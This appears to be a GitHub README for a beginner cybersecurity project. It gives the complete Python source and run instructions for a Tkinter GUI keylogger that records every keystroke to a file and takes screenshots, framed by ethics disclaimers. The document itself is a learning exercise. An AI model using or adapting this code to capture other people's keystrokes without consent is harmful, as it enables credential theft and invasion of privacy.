### 💀🕶️ Black Phantom Logger

## ⚠️ Warning & Ethical Considerations
**🚨 This tool is meant for eductional purpose and learning cybersecurity only!**
- Do **not** use this tool without proper authorization.
- Unauthorized use of keyloggers is **illegal and punishable** by law.
- The author **takes no responsibility** for any unethical or misuse use of this code.

🔴 **Use responsibly and ethically.**

## 🛠️ Tools Used
For writing and running the Python script, I used:

Thonny IDE – A beginner-friendly Python environment, great for easy script execution and debugging.

## 📦 Required Python Libraries
Before running the keylogger, install the necessary libraries:

`pip install pynput tkinter opencv-python pyautogui pillow`

# Libraries Explained:

`pynput` – Captures keystrokes in the background.

`tkinter` – Creates the GUI for our Black Phantom Logger.

`opencv-python` – Helps handle images (optional for additional features).

`pyautogui` – Captures screenshots.

`PIL (pillow)` – Supports image manipulation inside the GUI.

## 🚀 Project Overview
This is a simple keylogger with a dark hacker-themed GUI named Black Phantom Logger. It records keystrokes and saves them to a file. It also includes:

A graphical user interface (GUI) using Tkinter.

A dark "hacker-style" theme with a black and green aesthetic.

A button for starting and stopping the keylogger.

A logo of a hacker to enhance the simulation experience.

A feature to capture the screen as an extra functionality.

📜 Code Walkthrough
Let's break down the script step by step!

# 1️⃣ Importing Required Modules

```python
import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Listener
import os
import pyautogui
from PIL import Image, ImageTk```

`tkinter` – Creates the graphical interface.

`pynput.keyboard.Listener` – Monitors and records keystrokes.

`os` – Handles file operations.

`pyautogui` – Captures screenshots.

`PIL.Image, ImageTk` – Displays images in the GUI.

# 2️⃣ Creating the GUI (Graphical User Interface)

```python
root = tk.Tk()
root.title("Black Phantom Logger")
root.geometry("400x400")
root.configure(bg="black")
tk.Tk() – Initializes the main window.

title("Black Phantom Logger") – Sets the program title.

geometry("400x400") – Defines the window size.

configure(bg="black") – Applies the dark hacker-style theme.```

3️⃣ Adding a Hacker-Style Logo

logo = Image.open("hacker_logo.png")  # Make sure you have an image named hacker_logo.png
logo = logo.resize((100, 100))
logo = ImageTk.PhotoImage(logo)
logo_label = tk.Label(root, image=logo, bg="black")
logo_label.pack()
Loads a hacker-themed image to enhance the look.

Resizes the image and places it in the GUI.

4️⃣ Keystroke Logging Function

def log_keystrokes(key):
    key = str(key).replace("'", "")
    with open("keystrokes.txt", "a") as file:
        file.write(key + "\n")
Converts each pressed key into a string.

Saves the keystrokes into a text file (keystrokes.txt).

5️⃣ Screenshot Capture Function

def capture_screen():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    messagebox.showinfo("Screenshot", "Screenshot saved as screenshot.png")
Uses pyautogui.screenshot() to take a snapshot.

Saves the image as "screenshot.png".

Displays a confirmation message.

6️⃣ Start & Stop Buttons

def start_logger():
    global listener
    listener = Listener(on_press=log_keystrokes)
    listener.start()
    messagebox.showinfo("Logger", "Keylogger Started!")

def stop_logger():
    if listener:
        listener.stop()
        messagebox.showinfo("Logger", "Keylogger Stopped!")
start_logger() – Begins keylogging in the background.

stop_logger() – Stops the keylogger when needed.

7️⃣ Adding Buttons to GUI

start_button = tk.Button(root, text="Start Logging", command=start_logger, bg="green", fg="white")
stop_button = tk.Button(root, text="Stop Logging", command=stop_logger, bg="red", fg="white")
screenshot_button = tk.Button(root, text="Capture Screen", command=capture_screen, bg="blue", fg="white")

start_button.pack(pady=10)
stop_button.pack(pady=10)
screenshot_button.pack(pady=10)
Buttons added:

Start Logging (Green Button)

Stop Logging (Red Button)

Capture Screen (Blue Button)

8️⃣ Running the GUI

root.mainloop()
root.mainloop() keeps the window running.

### 🎭 Features & Hacker Simulation Experience
Dark Theme: A black & green color scheme for a hacker-like feel.

Hacker Logo: Enhances the interface's aesthetics.

Keylogging: Logs all keystrokes into a file.

Screen Capture: Takes a screenshot for additional monitoring.

### ⚠️ Warning & Ethical Considerations

🚨 This tool is meant for learning cybersecurity only!

Do not use this tool without proper authorization.

Unauthorized use of keyloggers is illegal and punishable by law.

The author takes no responsibility for any unethical use.

🔴 Use responsibly and ethically.

### 👨‍💻 How to Run the Keylogger
Install Thonny IDE (if not installed).

Download or clone this repository:

git clone (https://github.com/AhmedSalahHassanQatar/PRODIGY_CS_04)
cd black-phantom-logger

Install dependencies:
pip install pynput tkinter opencv-python pyautogui pillow
Run the script in Thonny or terminal:
python keylogger.py

📜 Final Words
This project is a basic yet powerful way to understand how keyloggers work in a cybersecurity research context. If you're a beginner, this is a great starting point for learning about ethical hacking, Python scripting, and GUI development.

🚀 Happy Learning, and Stay Ethical!
